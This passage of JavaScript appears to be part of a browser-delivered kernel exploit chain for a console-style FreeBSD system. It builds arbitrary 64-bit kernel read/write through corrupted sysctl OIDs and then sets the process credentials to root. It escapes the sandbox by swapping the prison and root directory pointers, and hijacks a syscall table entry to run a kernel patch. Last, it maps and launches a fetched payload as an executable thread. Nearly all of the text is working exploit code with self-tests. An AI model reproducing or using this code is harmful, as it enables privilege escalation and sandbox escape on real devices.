        "wrote=" + capsWrote + " skip=" + (capsSkip || "none") + " armings=" + armCount
      );
      const after = kernFile(false, "after-unhide");
      const got = after.rv === 0 ? kernFile(true, "with-buffer") : null;
      const capsLive = after.rv === 0;
      const A_OID = KBASE.add32(off.k_oid_maxfilesperproc);
      const A2_OID = KBASE.add32(off.k_oid_maxprocperuid);
      const B_OID = KBASE.add32(off.k_oid_maxfiles);
      const A_ARG1_CUR = KBASE.add32(off.k_arg1_maxfilesperproc);
      const A2_ARG1_CUR = KBASE.add32(off.k_arg1_maxprocperuid);
      const B_ARG1 = B_OID.add32(24);
      mark(
        "KRW-OIDS",
        "A(1,27)=" + A_OID + " A2(1,28)=" + A2_OID + " B(1,7)=" + B_OID + " &B.arg1=" + B_ARG1 + " capsLive=" + (capsLive ? 1 : 0)
      );
      const posA = planLow(A_ARG1_CUR, B_ARG1);
      const posA2 = planLow(A2_ARG1_CUR, B_ARG1.add32(4));
      mark(
        "KRW-PLAN",
        "posA=" + (posA ? posA.length : "REFUSED") + " posA2=" + (posA2 ? posA2.length : "REFUSED")
      );
      const planOk = capsLive && !!posA && !!posA2;
      if (!check(
        "krw-plan-ok",
        planOk,
        planOk ? "" : "capsLive=" + (capsLive ? 1 : 0) + " posA=" + (posA ? posA.length : "null") + " posA2=" + (posA2 ? posA2.length : "null")
      )) {
        allDone = true;
      } else {
        {
          let i = 0;
          wnode(i++, A_OID.add32(80), DUM, false);
          wnode(i++, A2_OID.add32(80), DUM, false);
          wnode(i++, B_OID.add32(80), DUM, false);
          for (let k = 0; k < posA.length; k++)
            wnode(i++, A_OID.add32(24 + posA[k]), DUM, false);
          for (let k = 0; k < posA2.length; k++)
            wnode(i++, A2_OID.add32(24 + posA2[k]), DUM, false);
          put(arDv, (i - 1) * NODE_SZ + 48, 0);
          mark(
            "KRW-FIRE",
            "nodes=" + i + " (3 unhide + " + posA.length + " A + " + posA2.length + " A2)"
          );
          if (!check("krw-fire-bounded", i > 0 && i <= MAXN, "nodes=" + i)) {
            allDone = true;
          } else if (runChain(i, "krw-setup") === null) {
            allDone = true;
          } else {
            let kMib = function(a, b) {
              kmDv.setInt32(0, a, true);
              kmDv.setInt32(4, b, true);
            }, kSysRead = function(a, b) {
              kMib(a, b);
              klDv.setInt32(0, 4, true);
              klDv.setInt32(4, 0, true);
              koDv.setInt32(0, 0, true);
              const r = sc(SYS.sysctl, kmAd, 2, koAd, klAd, 0, 0).i32;
              const er = r < 0 ? errno() : 0;
              const vl = koDv.getInt32(0, true);
              return { rv: r, err: er, val: vl };
            }, kSysWrite = function(a, b, v) {
              kMib(a, b);
              knDv.setInt32(0, v | 0, true);
              const r = sc(SYS.sysctl, kmAd, 2, 0, 0, knAd, 4).i32;
              const er = r < 0 ? errno() : 0;
              return { rv: r, err: er };
            }, steer = function(X) {
              kSysWrite(1, 27, X.low | 0);
              kSysWrite(1, 28, X.hi | 0);
            }, kread32 = function(X) {
              steer(X);
              return kSysRead(1, 7).val >>> 0;
            }, kwrite32 = function(X, v) {
              steer(X);
              return kSysWrite(1, 7, v | 0).rv;
            }, read82 = function(X) {
              const lo = kread32(X), hi = kread32(X.add32(4));
              return new int64(lo >>> 0, hi >>> 0);
            }, write82 = function(X, V) {
              kwrite32(X, V.low | 0);
              kwrite32(X.add32(4), V.hi | 0);
            };
            const kmAb = new ArrayBuffer(8);
            keepAlive2.push(kmAb);
            const kmDv = new DataView(kmAb), kmAd = bufAddr(kmAb);
            const koAb = new ArrayBuffer(4);
            keepAlive2.push(koAb);
            const koDv = new DataView(koAb), koAd = bufAddr(koAb);
            const knAb = new ArrayBuffer(4);
            keepAlive2.push(knAb);
            const knDv = new DataView(knAb), knAd = bufAddr(knAb);
            const klAb = new ArrayBuffer(8);
            keepAlive2.push(klAb);
            const klDv = new DataView(klAb), klAd = bufAddr(klAb);
            const t1 = kread32(A_OID.add32(16));
            mark("KRW-T1-READ32-IMG", "*(A_oid+0x10)=" + t1 + " want=27");
            check("krw-read32-image", t1 === 27, "got=" + t1);
            const t2 = read82(A_OID.add32(16));
            const t2ok = t2.low >>> 0 === 27 && t2.hi >>> 0 === 3221487618;
            mark(
              "KRW-T2-READ8-IMG",
              "*(A_oid+0x10)=" + t2 + " want=lo:27 hi:0xc0040002"
            );
            check("krw-read8-image", t2ok, "got=" + t2);
            const uidNow = sc(SYS.getuid).i32 >>> 0;
            const t3 = kread32(UCRED.add32(4));
            mark(
              "KRW-T3-READ32-HEAP",
              "*(ucred+0x04)=cr_uid=" + t3 + " getuid=" + uidNow
            );
            check(
              "krw-read32-heap",
              t3 === uidNow,
              "cr_uid=" + t3 + " getuid=" + uidNow
            );
            mark("KRW-T3B-READ8-HEAP", "read8(ucred)=" + read82(UCRED));
            const SCR4 = KBASE.add32(off.k_arg1_maxfiles);
            const o4 = kread32(SCR4);
            kwrite32(SCR4, 1094861636);
            const r4 = kread32(SCR4);
            kwrite32(SCR4, o4 | 0);
            const b4 = kread32(SCR4);
            mark(
              "KRW-T4-WRITE32",
              "orig=" + o4 + " wrote=0x41424344 readback=0x" + r4.toString(16) + " restored=" + b4
            );
            check(
              "krw-write32",
              r4 === 1094861636 && b4 === o4,
              "readback=0x" + r4.toString(16) + " restored=" + b4
            );
            const SCR8 = KBASE.add32(off.k_oid_maxfiles + 32);
            const o8 = read82(SCR8);
            const MAGIC8 = new int64(3735928559, 287454020);
            write82(SCR8, MAGIC8);
            const r8 = read82(SCR8);
            write82(SCR8, o8);
            const b8 = read82(SCR8);
            const t5ok = r8.low >>> 0 === 3735928559 && r8.hi >>> 0 === 287454020 && b8.low >>> 0 === o8.low >>> 0 && b8.hi >>> 0 === o8.hi >>> 0;
            mark(
              "KRW-T5-WRITE64",
              "orig=" + o8 + " wrote=" + MAGIC8 + " readback=" + r8 + " restored=" + b8
            );
            check("krw-write64", t5ok, "readback=" + r8 + " restored=" + b8);
            mark(
              "KRW-VERDICT",
              "fw=" + fwKey + " kernel_base=" + KBASE + " read32=" + (t1 === 27 ? 1 : 0) + " read8=" + (t2ok ? 1 : 0) + " heap=" + (t3 === uidNow ? 1 : 0) + " write32=" + (r4 === 1094861636 ? 1 : 0) + " write64=" + (t5ok ? 1 : 0) + " armings=" + armCount + "  ** full 64-bit arbitrary kernel R/W, syscall speed, 0 armings **"
            );
            mark(
              "KRW-API",
              "read8/write8/kread32/kwrite32 ready -- drop into the lapse/poops jailbreak stages (sysent hijack -> kpatch -> payload)"
            );
            const krwOk = t1 === 27 && t2ok && t3 === uidNow && r4 === 1094861636 && t5ok;
            mark(
              "EG-GATE",
              "krwOk=" + (krwOk ? 1 : 0) + " jb=" + (DO_JB ? 1 : 0) + " patch=" + (DO_PATCH ? 1 : 0) + " payload=" + (DO_PAYLOAD ? 1 : 0)
            );
            if (!check(
              "eg-krw-ok",
              krwOk,
              "krwOk=" + (krwOk ? 1 : 0) + " (endgame needs all 5 KRW self-tests to pass)"
            )) {
              allDone = true;
            } else {
              let kview = function(base) {
                return {
                  getBInt: (o) => read82(base.add32(o)),
                  setBInt: (o, v) => write82(base.add32(o), v),
                  getInt32: (o) => kread32(base.add32(o)) | 0,
                  setInt32: (o, v) => {
                    kwrite32(base.add32(o), v | 0);
                  }
                };
              }, findStub = function(num) {
                for (let o = 0; o < off.k_scan_stage1; o += 16) {
                  const v = p.read8(libkernelBase.add32(o));
                  if ((v.low & 16777215) !== 12633928 || v.hi >>> 24 !== 73)
                    continue;
                  if ((v.low >>> 24 | (v.hi & 16777215) << 8) >>> 0 === num)
                    return libkernelBase.add32(o);
                }
                return null;
              };
              const sameI64 = (a, b) => a.low >>> 0 === b.low >>> 0 && a.hi >>> 0 === b.hi >>> 0;
              const kptr = (v) => !!v && v.hi >>> 0 >= 4294901760;
              const NEG1 = new int64(4294967295, 4294967295);
              const stSetuid = findStub(23), stGeteuid = findStub(25), stOpen = findStub(5);
              let jbDone = false, kpDone = false, plDone = false, jbUcred = null;
              let jbSaved = null, jbRestored = false;
              let kpatchBlob = null, payloadBlob = null;
              const SITES = [];
              if (DO_PATCH) {
                try {
                  const r = await Promise.resolve({ ok: true, arrayBuffer: async () => __getPatchU8(KPATCH_FILE).buffer });
                  if (r.ok) kpatchBlob = new Uint8Array(await r.arrayBuffer());
                } catch (e) {
                  mark("KPATCH-FETCH-THREW", e && e.message || String(e));
                }
                if (kpatchBlob)
                  for (let i2 = 0; i2 + 7 <= kpatchBlob.length; i2++) {
                    if (kpatchBlob[i2] !== 198 || kpatchBlob[i2 + 1] !== 129)
                      continue;
                    if (kpatchBlob[i2 + 6] !== 235) continue;
                    SITES.push(
                      (kpatchBlob[i2 + 2] | kpatchBlob[i2 + 3] << 8 | kpatchBlob[i2 + 4] << 16 | kpatchBlob[i2 + 5] << 24) >>> 0
                    );
                  }
                mark(
                  "KPATCH-BLOB",
                  "file=" + KPATCH_FILE + " bytes=" + (kpatchBlob ? kpatchBlob.length : 0) + " sites=" + SITES.length
                );
              }
              if (DO_PAYLOAD) {
                try {
                  const r = await fetch(PAYLOAD_FILE);
                  if (r.ok) payloadBlob = new Uint8Array(await r.arrayBuffer());
                } catch (e) {
                  mark("PAYLOAD-FETCH-THREW", e && e.message || String(e));
                }
                mark(
                  "PAYLOAD-BLOB",
                  "file=" + PAYLOAD_FILE + " bytes=" + (payloadBlob ? payloadBlob.length : 0) + " head=" + (payloadBlob ? payloadBlob[0] === 233 ? "e9-ok" : "NOT-e9" : "none")
                );
              }
              if (DO_JB) {
                const P_UCRED = 64, P_FD = 72, TD_PROC = 8;
                const CR_UID = 4, CR_RUID = 8, CR_SVUID = 12, CR_NGROUPS = 16;
                const CR_RGID = 20, CR_PRISON = 48, CR_SCECAPS1 = 96, CR_SCECAPS0 = 104;
                const FD_RDIR = 16, FD_JDIR = 24;
                const curproc = read82(CT1.add32(TD_PROC));
                jbUcred = kptr(curproc) ? read82(curproc.add32(P_UCRED)) : null;
                const pFd = kptr(curproc) ? read82(curproc.add32(P_FD)) : null;
                const prison0 = KBASE.add32(off.k_prison0);
                const rootvn = read82(KBASE.add32(off.k_rootvnode));
                mark(
                  "JB-SOURCES",
                  "curproc=" + curproc + " ucred=" + jbUcred + " krwUcred=" + UCRED + " p_fd=" + pFd + " prison0=" + prison0 + " rootvnode=" + rootvn
                );
                const srcOk = kptr(curproc) && kptr(jbUcred) && kptr(pFd) && kptr(rootvn) && sameI64(jbUcred, UCRED);
                if (check(
                  "jb-sources-are-kernel-pointers",
                  srcOk,
                  "curproc=" + curproc + " ucred=" + jbUcred + " pfd=" + pFd + " rootvn=" + rootvn
                )) {
                  const uidBefore = sc(SYS.getuid).i32;
                  const probePaths = ["/", "/system", "/mini-syscore.elf"];
                  const before = [];
                  if (stOpen)
                    for (const pth of probePaths) {
                      const pab = new ArrayBuffer(pth.length + 1);
                      keepAlive2.push(pab);
                      const pu8 = new Uint8Array(pab);
                      for (let i2 = 0; i2 < pth.length; i2++)
                        pu8[i2] = pth.charCodeAt(i2);
                      const fd = callAddr(stOpen, [bufAddr(pab), 0, 0]).i32;
                      before.push(pth + "=" + fd);
                      if (fd >= 0) sc(SYS.close, fd);
                    }
                  mark(
                    "JB-PRECHECK",
                    "getuid=" + uidBefore + " sandbox=[" + before.join(" ") + "]"
                  );
                  const U = kview(jbUcred), F = kview(pFd);
                  jbSaved = {
                    U,
                    F,
                    ucred: jbUcred,
                    fd: pFd,
                    prison: U.getBInt(CR_PRISON),
                    rdir: F.getBInt(FD_RDIR),
                    jdir: F.getBInt(FD_JDIR),
                    caps1: U.getBInt(CR_SCECAPS1),
                    caps0: U.getBInt(CR_SCECAPS0),
                    uid: U.getInt32(CR_UID),
                    ruid: U.getInt32(CR_RUID),
                    svuid: U.getInt32(CR_SVUID),
                    ngroups: U.getInt32(CR_NGROUPS),
                    rgid: U.getInt32(CR_RGID),
                    off: {
                      CR_UID,
                      CR_RUID,
                      CR_SVUID,
                      CR_NGROUPS,
                      CR_RGID,
                      CR_PRISON,
                      CR_SCECAPS1,
                      CR_SCECAPS0,
                      FD_RDIR,
                      FD_JDIR
                    }
                  };
                  mark(
                    "JB-SAVED",
                    "prison=" + jbSaved.prison + " rdir=" + jbSaved.rdir + " jdir=" + jbSaved.jdir + " uid=" + jbSaved.uid + " caps=" + jbSaved.caps1 + "/" + jbSaved.caps0 + "  (refcounted handles -- restoring these is what keeps fdescfree/crfree balanced at process exit)"
                  );
                  jbRestoreHook = function(why) {
                    if (jbRestored) return true;
                    F.setBInt(FD_RDIR, jbSaved.rdir);
                    F.setBInt(FD_JDIR, jbSaved.jdir);
                    U.setBInt(CR_PRISON, jbSaved.prison);
                    U.setBInt(CR_SCECAPS1, jbSaved.caps1);
                    U.setBInt(CR_SCECAPS0, jbSaved.caps0);
                    U.setInt32(CR_UID, jbSaved.uid);
                    U.setInt32(CR_RUID, jbSaved.ruid);
                    U.setInt32(CR_SVUID, jbSaved.svuid);
                    U.setInt32(CR_NGROUPS, jbSaved.ngroups);
                    U.setInt32(CR_RGID, jbSaved.rgid);
                    const okRdir = sameI64(F.getBInt(FD_RDIR), jbSaved.rdir);
                    const okJdir = sameI64(F.getBInt(FD_JDIR), jbSaved.jdir);
                    const okPr = sameI64(U.getBInt(CR_PRISON), jbSaved.prison);
                    const okAll = okRdir && okJdir && okPr;
                    mark(
                      "JB-RESTORE",
                      why + " rdir=" + (okRdir ? 1 : 0) + " jdir=" + (okJdir ? 1 : 0) + " prison=" + (okPr ? 1 : 0) + " uid=" + sc(SYS.getuid).i32 + " -> " + (okAll ? "fdescfree/crfree are balanced again" : "NOT RESTORED -- reboot before closing the browser")
                    );
                    check(
                      "JB-RESTORED-CLEAN",
                      okAll,
                      "rdir/jdir/prison readback"
                    );
                    jbRestored = okAll;
                    return okAll;
                  };
                  U.setInt32(CR_UID, 4919);
                  const probeUid = sc(SYS.getuid).i32 >>> 0;
                  mark(
                    "JB-UCRED-PROBE",
                    "wrote cr_uid=0x1337 getuid=0x" + probeUid.toString(16) + " match=" + (probeUid === 4919 ? 1 : 0)
                  );
                  U.setInt32(CR_UID, 0);
                  U.setInt32(CR_RUID, 0);
                  U.setInt32(CR_SVUID, 0);
                  U.setInt32(CR_NGROUPS, 1);
                  U.setInt32(CR_RGID, 0);
                  U.setBInt(CR_PRISON, prison0);
                  U.setBInt(CR_SCECAPS1, NEG1);
                  U.setBInt(CR_SCECAPS0, NEG1);
                  F.setBInt(FD_RDIR, rootvn);
                  F.setBInt(FD_JDIR, rootvn);
                  mark(
                    "JB-CAPS-READBACK",
                    "caps0=" + read82(jbUcred.add32(96)) + " caps1=" + read82(jbUcred.add32(104)) + " want=-1/-1"
                  );
                  const uidNow2 = sc(SYS.getuid).i32;
                  const euNow = stGeteuid ? callAddr(stGeteuid, []).i32 : uidNow2;
                  const suNow = stSetuid ? callAddr(stSetuid, [0]).i32 : 0;
                  const rbUid = U.getInt32(CR_UID);
                  const rbPrison = U.getBInt(CR_PRISON);
                  const rbRdir = F.getBInt(FD_RDIR);
                  const after2 = [];
                  let escaped = false;
                  if (stOpen)
                    for (let i2 = 0; i2 < probePaths.length; i2++) {
                      const pth = probePaths[i2];
                      const pab = new ArrayBuffer(pth.length + 1);
                      keepAlive2.push(pab);
                      const pu8 = new Uint8Array(pab);
                      for (let j = 0; j < pth.length; j++)
                        pu8[j] = pth.charCodeAt(j);
                      const fd = callAddr(stOpen, [bufAddr(pab), 0, 0]).i32;
                      after2.push(pth + "=" + fd);
                      if (fd >= 0) {
                        sc(SYS.close, fd);
                        if (before[i2] && before[i2].indexOf("=-") > 0)
                          escaped = true;
                      }
                    }
                  jbDone = uidNow2 === 0 && rbUid === 0 && sameI64(rbPrison, prison0) && sameI64(rbRdir, rootvn);
                  jailbroken = jbDone;
                  mark(
                    "JB-ROOT",
                    "getuid=" + uidNow2 + " geteuid=" + euNow + " setuid0=" + suNow + " cr_uid=" + rbUid + " cr_prison=" + rbPrison + " fd_rdir=" + rbRdir + " sandbox_after=[" + after2.join(" ") + "] escaped=" + (escaped ? 1 : 0)
                  );
                  check(
                    "JB-ROOT-AND-ESCAPE",
                    jbDone,
                    "getuid=" + uidNow2 + " cr_uid=" + rbUid
                  );
                }
              }
              if (jbDone && DO_PATCH) {
                const jitStub = findStub(533), kexecStub = findStub(661);
                mark(
                  "KPATCH-PRE",
                  "sites=" + SITES.length + " jitStub=" + (jitStub ? 1 : 0) + " kexecStub=" + (kexecStub ? 1 : 0)
                );
                if (check(
                  "kpatch-preconditions",
                  !!kpatchBlob && SITES.length >= 4 && !!jitStub && !!kexecStub,
                  "blob/sites/stubs missing"
                )) {
                  if (jbUcred) {
                    write82(jbUcred.add32(96), NEG1);
                    write82(jbUcred.add32(104), NEG1);
                  }
                  mark(
                    "JIT-CRED",
                    "caps1=" + (jbUcred ? read82(jbUcred.add32(104)) : "n/a") + " geteuid=" + (stGeteuid ? callAddr(stGeteuid, []).i32 : -1)
                  );
                  const jitFd = callAddr(jitStub, [0, 16384, 7]).i32;
                  const jitErr = jitFd < 0 ? errno() : 0;
                  const KEXEC_MAP = new int64(537919488, 9);
                  const mm = sc(SYS.mmap, KEXEC_MAP, 16384, 7, 17, jitFd, 0);
                  const mapAddr = new int64(mm.lo, mm.hi);
                  const mapErr = mm.i32 === -1 ? errno() : 0;
                  const mapOk = jitFd >= 0 && mm.i32 !== -1 && sameI64(mapAddr, KEXEC_MAP);
                  mark(
                    "KPATCH-MAP",
                    "jitshm=" + jitFd + " jitErr=" + jitErr + " mmap=" + mapAddr + " mapErr=" + mapErr + " fixed=" + KEXEC_MAP
                  );
                  if (check(
                    "kpatch-rwx-map",
                    mapOk,
                    "jitFd=" + jitFd + " jitErr=" + jitErr + " map=" + mapAddr
                  )) {
                    for (let o = 0; o < kpatchBlob.length; o += 8) {
                      let lo = 0, hi = 0;
                      for (let k = 0; k < 4; k++)
                        lo |= (kpatchBlob[o + k] || 0) << 8 * k;
                      for (let k = 0; k < 4; k++)
                        hi |= (kpatchBlob[o + 4 + k] || 0) << 8 * k;
                      p.write8(mapAddr.add32(o), new int64(lo >>> 0, hi >>> 0));
                    }
                    let copied = true;
                    for (let o = 0; o < kpatchBlob.length && copied; o++)
                      if (p.read1(mapAddr.add32(o)) !== kpatchBlob[o])
                        copied = false;
                    mark(
                      "KPATCH-COPY",
                      "bytes=" + kpatchBlob.length + " copied=" + (copied ? 1 : 0)
                    );
                    if (check("kpatch-blob-copied", copied, "")) {
                      const sysent = KBASE.add32(off.k_sysent_661);
                      const gadget = KBASE.add32(off.k_jmp_rsi);
                      const SV = kview(sysent);
                      const oNarg = SV.getInt32(0);
                      const oCall = SV.getBInt(8);
                      const oThr = SV.getInt32(44);
                      const gb = read82(gadget);
                      const gadgetOk = (gb.low & 65535) === 9983;
                      let sitesOk = true;
                      for (const st of SITES) {
                        const b = read82(KBASE.add32(st)).low & 255;
                        if (!(b >= 112 && b <= 127 || b === 235))
                          sitesOk = false;
                      }
                      mark(
                        "SYSENT-SAVE",
                        "narg=" + oNarg + " call=" + oCall + " thr=" + oThr + " gadget=" + gadget + "(ff26=" + (gadgetOk ? 1 : 0) + ") sitesOk=" + (sitesOk ? 1 : 0)
                      );
                      if (check(
                        "kpatch-arm-gates",
                        gadgetOk && kptr(oCall) && sitesOk && oNarg >= 0 && oNarg <= 8,
                        "gadget=" + (gadgetOk ? 1 : 0) + " oCall_kptr=" + (kptr(oCall) ? 1 : 0) + " sites=" + (sitesOk ? 1 : 0)
                      )) {
                        let rc = -1;
                        try {
                          SV.setInt32(0, 2);
                          SV.setBInt(8, gadget);
                          SV.setInt32(44, 1);
                          const armed = sameI64(SV.getBInt(8), gadget);
                          mark(
                            "SYSENT-ARMED",
                            "sy_call=" + SV.getBInt(8) + " ok=" + (armed ? 1 : 0)
                          );
                          if (armed) rc = callAddr(kexecStub, [mapAddr]).i32;
                        } finally {
                          SV.setInt32(0, oNarg);
                          SV.setBInt(8, oCall);
                          SV.setInt32(44, oThr);
                        }
                        let allEb = true;
                        for (const st of SITES)
                          if ((read82(KBASE.add32(st)).low & 255) !== 235)
                            allEb = false;
                        const restored = sameI64(SV.getBInt(8), oCall) && SV.getInt32(0) === oNarg && SV.getInt32(44) === oThr;
                        kpDone = rc === 0 && allEb && restored;
                        kpatched = kpDone;
                        mark(
                          "KEXEC",
                          "syscall(661)=" + rc + " sites_eb=" + (allEb ? 1 : 0) + " sysent_restored=" + (restored ? 1 : 0)
                        );
                        check(
                          "KERNEL-PATCHED",
                          kpDone,
                          "rc=" + rc + " allEb=" + (allEb ? 1 : 0) + " restored=" + (restored ? 1 : 0)
                        );
                      }
                    }
                  }
                }
              }
              let tdOk = false;
              try {
                const TDU = CT1.add32(304);
                const before = read82(TDU);
                const wasOk = sameI64(before, UCRED);
                if (!wasOk) write82(TDU, UCRED);
                const after2 = read82(TDU);
                tdOk = sameI64(after2, UCRED);
                mark(
                  "JB-TDUCRED",
                  "w1.td_ucred=" + before + " want=" + UCRED + " passB_restore_was_exact=" + (wasOk ? 1 : 0) + " repaired=" + (wasOk ? 0 : 1) + " now=" + after2
                );
                check(
                  "JB-TDUCRED-CLEAN",
                  tdOk,
                  "w1.td_ucred must equal the real ucred before this thread is torn down at process exit (crfree runs on it)"
                );
              } catch (e6) {
                tdOk = false;
                mark(
                  "JB-TDUCRED-THREW",
                  e6 && e6.message || String(e6)
                );
              }
              let restoreOk = true;
              if (jbRestoreHook && !KEEP_JB) {
                restoreOk = !!jbRestoreHook("end-of-run");
              } else if (jbRestoreHook && KEEP_JB) {
                mark(
                  "JB-KEEP",
                  "?keepjb=1 -- jailbreak left LIVE until pagehide"
                );
                window.addEventListener("pagehide", function() {
                  try {
                    jbRestoreHook("pagehide");
                  } catch (e) {
                  }
                });
              }
              const cleanEnough = tdOk && (KEEP_JB || restoreOk);
              if (!cleanEnough) {
                mark(
                  "PAYLOAD-SKIPPED",
                  "cleanup incomplete (tdOk=" + (tdOk ? 1 : 0) + " restoreOk=" + (restoreOk ? 1 : 0) + ") -- reboot required"
                );
              } else if (kpDone && DO_PAYLOAD && payloadBlob && payloadBlob[0] === 233) {
                const sz = payloadBlob.length + 16383 & ~16383;
                const m2 = sc(SYS.mmap, 0, sz, 7, 4098, -1, 0);
                const entry = new int64(m2.lo, m2.hi);
                const mErr = m2.i32 === -1 ? errno() : 0;
                const entryOk = m2.i32 !== -1 && entry.hi >>> 0 > 0;
                mark(
                  "PAYLOAD-MAP",
                  "mmap(anon,rwx,0x" + sz.toString(16) + ")=" + entry + " err=" + mErr
                );
                if (check(
                  "payload-rwx-map",
                  entryOk,
                  "map=" + entry + " err=" + mErr
                )) {
                  for (let o = 0; o < payloadBlob.length; o += 8) {
                    let lo = 0, hi = 0;
                    for (let k = 0; k < 4; k++)
                      lo |= (payloadBlob[o + k] || 0) << 8 * k;
                    for (let k = 0; k < 4; k++)
                      hi |= (payloadBlob[o + 4 + k] || 0) << 8 * k;
                    p.write8(entry.add32(o), new int64(lo >>> 0, hi >>> 0));
                  }
                  let bad2 = -1;
                  for (let o = 0; o < payloadBlob.length && bad2 < 0; o++)
                    if (p.read1(entry.add32(o)) !== payloadBlob[o]) bad2 = o;
                  mark(
                    "PAYLOAD-COPY",
                    "bytes=" + payloadBlob.length + (bad2 < 0 ? " ok" : " MISMATCH@0x" + bad2.toString(16))
                  );
                  const slot = webkitBase.add32(off.wk___imp_pthread_create);
                  const fn = p.read8(slot);
                  const expect = libkernelBase.add32(off.k_pthread_create);
                  mark("PTHREAD-RESOLVE", "got=" + fn + " expect=" + expect);
                  if (bad2 < 0 && check("pthread-got-matches", sameI64(fn, expect), "got=" + fn)) {
                    const thr = new ArrayBuffer(8);
                    keepAlive2.push(thr);
                    new Uint8Array(thr).fill(0);
                    const thrAddr = bufAddr(thr);
                    const rc = callAddr(expect, [thrAddr, 0, entry, 0]).i32;
                    const tdv = new DataView(thr);
                    const handle = new int64(
                      tdv.getUint32(0, true),
                      tdv.getUint32(4, true)
                    );
                    plDone = rc === 0 && handle.hi >>> 0 > 0;
                    mark(
                      "PAYLOAD-RUN",
                      "pthread_create=" + rc + " handle=" + handle
                    );
                    check(
                      "PAYLOAD-RUNNING",
                      plDone,
                      "rc=" + rc + " handle=" + handle
                    );
                  }
                }
              }
              const stable = !!plDone && cleanEnough;
              payloadRunning = stable;
              mark(
                "EG-VERDICT",
                "fw=" + fwKey + " kernel_base=" + KBASE + " jailbroken=" + (jbDone ? 1 : 0) + " kpatched=" + (kpDone ? 1 : 0) + " payload_thread=" + (plDone ? 1 : 0) + " stable=" + (stable ? 1 : 0) + " tdOk=" + (tdOk ? 1 : 0) + " restoreOk=" + (restoreOk ? 1 : 0) + " jb_restored=" + (jbRestored ? 1 : 0) + " armings=" + armCount
              );
              allDone = stable;
            }
          }
        }
      }
      const capsBack = CAPS_RESTORE && capsWrote > 0 ? 256 - capsWrote & 255 : 0;
      const mf3 = multiFire(
        [
          { kind: "sweep", step: O_RAN, probe: OID.add32(81), low: 16777215 },
          { kind: "dec", addr: CAPS_B, n: capsBack }
        ],
        "oid+0x54+caps-restore"
      );
      if (mf3 === null) return;
      const ran = mf3[0];
      mark(
        "KF-RAN",
        "oid+0x54=" + (ran.b < 0 ? "NO-MATCH" : "0x" + ran.b.toString(16)) + " cands=" + ran.n + " want=0x1"
      );
      check(
        "KF-UNHIDE-LANDED",
        ran.b === 1 && ran.n === 1,
        "oid+0x54=" + ran.b + " (1 => sysctl_root passed the visibility check, so the .data write at kern.file oid+0x50 landed)"
      );
      let xfData = null, xfFile = null, kfSeen = 0;
      if (got && got.rv === 0 && got.len >= 80) {
        const n = Math.min(got.len, KF_BYTES) / 80 | 0;
        for (let i = 0; i < n; i++) {
          const o = i * 80;
          kfSeen++;
          if (kfDv.getUint32(o + 0, true) !== 80) continue;
          if (kfDv.getInt32(o + 8, true) !== pid) continue;
          if (kfDv.getInt32(o + 16, true) !== kfSock) continue;
          xfFile = new int64(
            kfDv.getUint32(o + 24, true),
            kfDv.getUint32(o + 28, true)
          );
          xfData = new int64(
            kfDv.getUint32(o + 56, true),
            kfDv.getUint32(o + 60, true)
          );
          break;
        }
        mark(
          "KF-SCAN",
          "entries=" + n + " seen=" + kfSeen + " pid=" + pid + " fd=" + kfSock + " xf_file=" + xfFile + " xf_data=" + xfData
        );
        check("KF-SOCKET-NAMED", !!xfData, "xf_data=" + xfData);
      } else {
        mark(
          "KF-SCAN",
          "skipped rv=" + after.rv + " errno=" + after.err + " reason=caps_gate_still_closed_as_predicted"
        );
      }
      mark(
        "KF-VERDICT",
        "fw=" + fwKey + " kernel_base=" + KBASE + " anchor_confirmed=" + (on.v === KERN_FILE_NUM ? 1 : 0) + " unhide_landed=" + (ran.b === 1 ? 1 : 0) + " sysctl_rv=" + after.rv + " errno=" + after.err + " xf_data=" + (xfData ? xfData : "none") + " armings=" + armCount + " next=set_cr_sceCaps_bit62_ucred+0x64_bit30"
      );
      mark(
        "KF-DATA-LEFT-DIRTY",
        "oid+0x50 left nonzero and oid+0x51..0x54 perturbed by the sweep -- .data is reloaded from the boot image, so REBOOT clears it. No restore attempted on purpose."
      );
      {
        const nodes = 256 + capsWrote + (CAPS_RESTORE && capsWrote > 0 ? 256 - capsWrote : 0);
        mark(
          "CAPS-COLLATERAL",
          "caps67_nodes=" + nodes + " caps1_lo24_delta=-" + (nodes >> 8) + " exact=" + ((nodes & 255) === 0 ? 1 : 0) + " bits24_63=untouched kind=bitmask_not_pointer reboot=restores"
        );
      }
      setNode0(0, N0SINK);
      let renew = 0;
      for (const fd of POOL)
        if (sc(SYS.setsockopt, fd, IPPROTO_IPV6, IPV6_RTHDR, pAd, RTH_SIZE).i32 === 0)
          renew++;
      mark(
        "PR-NEUTRALISE",
        "next=0 on " + renew + "/" + POOL.length + "  armings_left_dangling=" + armCount + "  (workers deliberately NOT terminated: their td_proc is corrupt and terminate() would make them syscall)"
      );
    } catch (e) {
      mark("THREW", e && e.message ? e.message : String(e));
      state("threw", "bad");
    } finally {
      try {
        if (jbRestoreHook) jbRestoreHook("finally");
      } catch (e5) {
        mark("JB-RESTORE-THREW", e5 && e5.message || String(e5));
      }
      try {
        if (opened.length && closeFd && mainArmed) {
          let n = 0;
          for (const fd of opened) if (closeFd(fd) === 0) n++;
          mark("STRAGGLERS-CLOSED", n + "/" + opened.length);
        }
      } catch (e3) {
        mark("CLOSE-THREW", e3 && e3.message || String(e3));
      }
      try {
        if (pinRestore) pinRestore();
      } catch (e4) {
        mark("PIN-RESTORE-THREW", e4 && e4.message || String(e4));
      }
      try {
        if (mainArmed && mainMf && mainOrig && p) {
          p.write8(mainMf, mainOrig);
          mainArmed = false;
          mark("EXPM1-RESTORED", "expm1(1)=" + Math.expm1(1));
        }
      } catch (e2) {
        mark("DISARM-THREW", e2 && e2.message || String(e2));
      }
      try {
        if (typeof A !== "undefined" && A) A.busy = 0;
      } catch (e) {
      }
      mark(
        "PROOF-SUMMARY-FINAL",
        "pass=" + passCount + " fail=" + failCount + (allDone ? "" : "  INCOMPLETE")
      );
      try {
        if (!alreadyLoaded) finishUI(payloadRunning);
      } catch (eUI) {
      }
    }
  })();
})();
